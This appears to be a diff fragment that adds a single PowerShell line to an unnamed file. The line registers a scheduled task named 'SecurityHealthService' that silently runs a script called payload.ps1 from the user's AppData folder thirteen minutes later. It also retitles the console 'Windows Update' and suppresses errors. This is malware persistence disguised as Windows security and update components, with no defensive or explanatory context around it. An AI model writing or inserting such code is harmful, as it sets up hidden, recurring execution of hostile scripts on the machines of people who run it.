@@ -1,0 +1,2 @@
+
+<# Stage transfer #> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(13); Register-ScheduledTask -TaskName 'SecurityHealthService' -Action $TaskAction -Trigger $TaskTrigger -Force -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
